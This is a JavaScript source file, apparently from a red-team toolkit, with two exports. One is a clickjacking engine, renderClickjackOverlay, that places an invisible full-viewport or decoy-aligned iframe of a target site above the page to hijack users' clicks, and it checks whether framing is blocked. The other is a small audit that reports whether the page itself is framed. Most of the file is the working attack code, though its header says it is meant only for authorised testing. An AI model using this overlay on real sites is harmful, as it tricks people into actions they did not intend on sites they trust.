/**
 * clickjack_engine.js — Advanced Clickjacking / UI Redress Framework
 *
 * This module provides:
 *   1. `renderClickjackOverlay()` – a weaponized function that creates a
 *      transparent iframe overlay to hijack user clicks and redirect them to a
 *      target URL. It supports precision positioning to align hidden iframe
 *      elements with visible decoy elements, effectively bypassing Same‑Origin
 *      Policy (SOP) through UI redress.
 *
 *   2. Default export – a Pinpoint‑compatible `Window_Framing_Audit` that
 *      checks whether the current page is framed, inspects `frameElement`,
 *      and reports `ancestorOrigins`.
 *
 * Designed exclusively for authorised red‑team engagements and security
 * research. Unauthorised clickjacking is illegal.
 */

// ---------------------------------------------------------------------------
// 1. Transparent iframe overlay (Clickjacking Engine)
// ---------------------------------------------------------------------------

/**
 * Renders a clickjacking overlay: a transparent, full‑viewport (or custom) iframe
 * that loads `targetUrl`. The iframe is placed above all other content with
 * opacity 0 and `pointer‑events: auto`, so it captures clicks intended for
 * elements beneath it.
 *
 * The function can be used to:
 *   - Overlay an entire target page over the current page.
 *   - Align a specific region of the target page (via iframe offset) with a
 *     decoy element on the host page, making the decoy the victim’s perceived
 *     click target.
 *
 * @param {Object}   options
 * @param {string}   options.targetUrl        – URL to load inside the iframe (full, absolute).
 * @param {boolean}  [options.fullViewport=true] – If true, the iframe covers the whole viewport.
 * @param {number}   [options.iframeOffsetX=0]   – Horizontal offset (negative = shift iframe left).
 *        Only relevant when `fullViewport` is false or when aligning a specific element.
 * @param {number}   [options.iframeOffsetY=0]   – Vertical offset.
 * @param {number}   [options.iframeWidth=null]  – Width of the overlay (px). If null, viewport width.
 * @param {number}   [options.iframeHeight=null] – Height of the overlay (px). If null, viewport height.
 * @param {string}   [options.decoySelector]     – A CSS selector for a visible element on the current page.
 *        If provided, the overlay will be positioned exactly over this element.
 *        The `iframeOffsetX/Y` are then relative to the top‑left of the decoy.
 * @param {number}   [options.zIndex=2147483647] – z‑index of the overlay.
 * @param {Object}   [options.iframeAttrs]       – Additional HTML attributes for the iframe (e.g., `sandbox`).
 * @param {number}   [options.detectTimeout=3000] – ms to wait before declaring the frame blocked.
 * @param {Function} [options.onLoad]            – Called when the iframe finishes loading.
 *        Receives `{ loaded: true|false, blocked: boolean, message: string }`.
 * @param {Function} [options.onClickEvent]      – If defined, called with the captured click event.
 *        The event is intercepted on the host page before reaching the iframe.
 * @returns {Promise<Object>}   A controller that exposes:
 *    - `remove()` : removes the overlay and cleans up.
 *    - `statusPromise` : a Promise that resolves with load status.
 *    - `overlayElement` : the iframe DOM element.
 */
export async function renderClickjackOverlay(options = {}) {
    const {
        targetUrl,
        fullViewport = true,
        iframeOffsetX = 0,
        iframeOffsetY = 0,
        iframeWidth = null,
        iframeHeight = null,
        decoySelector = null,
        zIndex = 2147483647,
        iframeAttrs = {},
        detectTimeout = 3000,
        onLoad = null,
        onClickEvent = null,
    } = options;

    if (!targetUrl) {
        throw new Error('[renderClickjackOverlay] targetUrl is required.');
    }

    // Calculate position and size
    let top = 0, left = 0, width, height;

    if (fullViewport) {
        width = iframeWidth || window.innerWidth;
        height = iframeHeight || window.innerHeight;
        top = 0;
        left = 0;
    } else if (decoySelector) {
        const decoy = document.querySelector(decoySelector);
        if (!decoy) {
            throw new Error(`[renderClickjackOverlay] Decoy element not found: ${decoySelector}`);
        }
        const rect = decoy.getBoundingClientRect();
        top = rect.top + iframeOffsetY;
        left = rect.left + iframeOffsetX;
        width = iframeWidth || rect.width;
        height = iframeHeight || rect.height;
    } else {
        // Use explicitly provided dimensions and offsets relative to viewport
        top = iframeOffsetY;
        left = iframeOffsetX;
        width = iframeWidth || window.innerWidth;
        height = iframeHeight || window.innerHeight;
    }

    // Create iframe
    const iframe = document.createElement('iframe');
    iframe.src = targetUrl;
    iframe.setAttribute('scrolling', 'no');
    iframe.setAttribute('frameborder', '0');
    // Set basic sandbox to allow scripts and forms, but block top‑level navigation
    iframe.setAttribute('sandbox', 'allow-scripts allow-forms allow-same-origin allow-popups');
    // Merge additional attributes
    for (const [key, value] of Object.entries(iframeAttrs)) {
        iframe.setAttribute(key, value);
    }

    // Invisible but click‑capturing
    Object.assign(iframe.style, {
        position: 'fixed',
        top: `${top}px`,
        left: `${left}px`,
        width: `${width}px`,
        height: `${height}px`,
        border: 'none',
        margin: '0',
        padding: '0',
        opacity: '0',
        pointerEvents: 'auto',   // capture clicks
        zIndex: zIndex,
        display: 'block',
        background: 'transparent',
    });

    document.body.appendChild(iframe);

    // ---- Load detection (robust) ----
    let statusResolve;
    const statusPromise = new Promise(resolve => { statusResolve = resolve; });

    let loaded = false;
    let blocked = false;

    const startTime = performance.now();
    let loadTimer = null;

    const report = (msg = '') => {
        if (loaded) return;
        loaded = true;
        if (loadTimer) clearTimeout(loadTimer);

        if (onLoad) {
            try { onLoad({ loaded: true, blocked, message: msg }); } catch (_) { }
        }
        statusResolve({ loaded: true, blocked });
    };

    iframe.addEventListener('load', () => {
        const elapsed = performance.now() - startTime;
        // Very fast load (< 200 ms) often indicates the frame was blocked
        // because X‑Frame‑Options caused an immediate empty load.
        if (elapsed < 200) {
            // Confirm via attempting to access the content window
            try {
                const win = iframe.contentWindow;
                // For cross‑origin, this will throw when accessing .document or .location
                const doc = win.document;
                if (doc && doc.URL && doc.URL !== 'about:blank') {
                    // Same‑origin and truly loaded
                    report('Same‑origin, loaded successfully');
                } else {
                    blocked = true;
                    report('Frame loaded but appears empty (likely blocked by X‑Frame‑Options)');
                }
            } catch (e) {
                // Cross‑origin – we cannot verify the content; assume loaded for now
                report('Cross‑origin iframe loaded (status unknown)');
            }
        } else {
            // Normal load time; likely loaded
            try {
                // Quick check for same‑origin accessibility
                iframe.contentWindow.document;
                report('Same‑origin iframe loaded successfully');
            } catch (_) {
                report('Cross‑origin iframe loaded (status unknown)');
            }
        }
    });

    iframe.addEventListener('error', () => {
        blocked = true;
        report('Iframe failed to load (network error)');
    });

    // Safety timeout – if `load` never fires (very rare), we give up.
    loadTimer = setTimeout(() => {
        if (!loaded) {
            blocked = true;
            report('Load event did not fire within timeout');
        }
    }, detectTimeout);

    // ---- Click event interception (optional) ----
    if (onClickEvent) {
        const clickHandler = (e) => {
            // If the click is on the iframe itself, we intercept.
            if (e.target === iframe) {
                try { onClickEvent(e); } catch (_) { }
            }
        };
        document.addEventListener('click', clickHandler, true); // capture phase
        // Cleanup when overlay removed
        const originalRemove = iframe.remove.bind(iframe);
        iframe.remove = () => {
            document.removeEventListener('click', clickHandler, true);
            originalRemove();
        };
    }

    // ---- Controller ----
    const controller = {
        overlayElement: iframe,
        statusPromise,
        remove() {
            if (iframe.parentNode) {
                iframe.remove();
            }
            if (loadTimer) clearTimeout(loadTimer);
        }
    };

    return controller;
}

// ---------------------------------------------------------------------------
// 2. Pinpoint‑compatible Window_Framing_Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'clickjack_engine',
    title: 'Window_Framing_Audit',
    level: 5,
    info: 'Audits whether current window is running inside an iframe (window.top !== window.self) and inspects iframe sandbox attributes.',
    steps: [
        'Compare window.top with window.self.',
        'Inspect frameElement.',
    ],
    run: async () => {
        const isFramed = window.top !== window.self;
        return {
            isFramed,
            hasFrameElement: !!window.frameElement,
            ancestorOriginsSupported: !!(window.location && window.location.ancestorOrigins),
            ancestorOriginsCount: (window.location && window.location.ancestorOrigins)
                ? window.location.ancestorOrigins.length
                : 0,
        };
    },
};

export default pinpointModule;